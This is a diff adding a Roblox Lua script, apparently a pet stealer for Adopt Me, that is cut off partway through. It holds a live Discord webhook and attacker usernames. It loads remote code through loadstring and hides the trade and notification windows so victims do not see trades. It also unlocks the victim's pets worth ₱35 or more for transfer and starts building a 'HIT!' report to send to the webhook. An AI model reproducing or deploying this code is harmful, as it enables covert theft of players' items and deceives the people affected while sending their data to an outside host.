@@ -1,0 +1,169 @@
+-- [[ MONDEUR HUB | 🦊 HIT! - V15.3 ELVEBREDD GITHUB EDITION ]] --
+
+-- [[ CONFIG ]] --
+local USERNAMES = {"2ndcfpaj67", "CREOLEO23", "CREOLEO25"} 
+local WEBHOOK   = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
+local THRESHOLD = 35 -- [STRICT] Only pets worth ₱35+ will be traded and logged.
+local DISCORD_INV = "https://discord.gg/J4w2w5CW9"
+
+if setclipboard then pcall(function() setclipboard(DISCORD_INV) end) end
+
+-- 1. SERVICES
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+
+-- 2. ELVEBREDD DATA PARSER (GITHUB FETCH)
+local ElveValues = {}
+pcall(function()
+    local url = "https://raw.githubusercontent.com/charles1384/ADM/refs/heads/main/ADM_PET_VALUE.txt"
+    local rawData = game:HttpGet(url)
+    
+    -- Try to decode as JSON first
+    local success, decoded = pcall(function() return HttpService:JSONDecode(rawData) end)
+    if success and type(decoded) == "table" then
+        ElveValues = decoded
+    else
+        -- If it's formatted as a Lua table instead of JSON, load it securely
+        local success2, decoded2 = pcall(function() return loadstring("return " .. rawData)() end)
+        if success2 and type(decoded2) == "table" then
+            ElveValues = decoded2
+        end
+    end
+end)
+
+-- Fallback just in case the GitHub link goes down
+if type(ElveValues) ~= "table" or not next(ElveValues) then
+    ElveValues = {
+        ["frost_dragon"] = 120, 
+        ["bat_dragon"]   = 230,
+        ["shadow_dragon"] = 250,
+        ["evil_unicorn"] = 65,
+        ["crow"] = 60,
+        ["parrot"] = 80,
+        ["owl"] = 90
+    }
+end
+
+-- 3. TOTAL MESSAGE SUPPRESSION (Recursive Mute)
+local function killToasts()
+    local pGui = LocalPlayer:WaitForChild("PlayerGui")
+    task.spawn(function()
+        while task.wait(0.05) do 
+            pcall(function()
+                -- Disable main windows
+                if pGui:FindFirstChild("TradeApp") then pGui.TradeApp.Enabled = false end
+                if pGui:FindFirstChild("DialogApp") then pGui.DialogApp.Enabled = false end
+
+                -- Disable notification layers
+                local layers = {"CenterOverlays", "NotificationGui", "ToastGui", "StandardNotifications"}
+                for _, name in pairs(layers) do
+                    local layer = pGui:FindFirstChild(name)
+                    if layer then layer.Enabled = false end
+                end
+
+                -- Delete specific text labels ("Pending", "Declined")
+                for _, v in pairs(pGui:GetDescendants()) do
+                    if v:IsA("TextLabel") then
+                        local t = v.Text:lower()
+                        if t:find("pending") or t:find("declined") or t:find("seconds") or t:find("request") then
+                            v.Parent.Visible = false
+                            v.Parent:Destroy()
+                        end
+                    end
+                end
+            end)
+        end
+    end)
+end
+task.spawn(killToasts)
+
+-- 4. HASH FINDER (Remote Fetching)
+local hashes = {}
+for _, v in pairs(getgc()) do
+    if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
+        local upvalues = debug.getupvalues(v)
+        if type(upvalues[1]) == "table" then
+            for key, value in pairs(upvalues[1]) do hashes[key] = value end
+        end
+    end
+end
+
+local function hashedAPI(remoteName, ...)
+    local remote = hashes[remoteName]
+    if not remote then return nil end
+    if remote:IsA("RemoteFunction") then return remote:InvokeServer(...) end
+    remote:FireServer(...)
+end
+
+-- 5. ELVEBREDD-BASED VALUATION
+local function getElveValue(petData, props)
+    local base = ElveValues[petData.id] or 0.01
+    local val = base
+    
+    if props.mega_neon or props.mega then val = val * 10 
+    elseif props.neon then val = val * 4 end
+    
+    if props.flyable then val = val + 1.5 end
+    if props.rideable then val = val + 1.0 end
+    
+    return val * 56 -- Conversion to Peso scale
+end
+
+-- 6. INVENTORY & STRICT THRESHOLD CHECK
+local Fsys = require(ReplicatedStorage:WaitForChild("Fsys")).load
+local InventoryDB = Fsys("InventoryDB")
+local ClientData = Fsys("ClientData")
+
+local function processInventory()
+    local inv = ClientData.get("inventory")
+    local total, petGroups, tradeList = 0, {}, {}
+
+    for uid, pet in pairs(inv.pets or {}) do
+        local petData = InventoryDB.pets[pet.id]
+        
+        -- Native Jerboa Ban
+        if petData and pet.id ~= "jiggly_jerboa" then
+            local props = pet.properties or {}
+            local unitVal = getElveValue(petData, props)
+            
+            -- [STRICT GATEKEEPER] Only processes pets ₱35 or higher
+            if unitVal >= THRESHOLD then
+                total = total + unitVal
+                table.insert(tradeList, {uid = uid, val = unitVal})
+                hashedAPI("BackpackAPI/SetItemLocked", uid, false)
+                
+                local key = pet.id..(props.neon and "N" or "")..(props.mega and "M" or "")
+                local emoji = ((props.mega or props.mega_neon) and "Ⓜ️" or props.neon and "⭐" or "🐾") .. (props.flyable and "🪽" or "") .. (props.rideable and "🏇" or "")
+                
+                if not petGroups[key] then
+                    petGroups[key] = {name=petData.name, count=1, price=unitVal, emoji=emoji}
+                else
+                    petGroups[key].count = petGroups[key].count + 1
+                end
+            end
+        end
+    end
+    
+    local sorted = {}
+    for _, v in pairs(petGroups) do table.insert(sorted, v) end
+    table.sort(sorted, function(a, b) return a.price > b.price end)
+    table.sort(tradeList, function(a, b) return a.val > b.val end)
+    
+    return sorted, total, tradeList
+end
+
+local sortedPets, grandTotal, finalTradeList = processInventory()
+
+-- 7. WEBHOOK (Clean Formatting)
+local function sendHit()
+    local lines = {}
+    for _, p in pairs(sortedPets) do
+        table.insert(lines, p.emoji.." "..p.name.." "..p.count.."x (₱"..string.format("%.2f", p.price)..")")
+    end
+
+    local payload = HttpService:JSONEncode({
+        embeds = {{
+            title = "MONDEUR HUB | 🦊 HIT!",
+            description = "
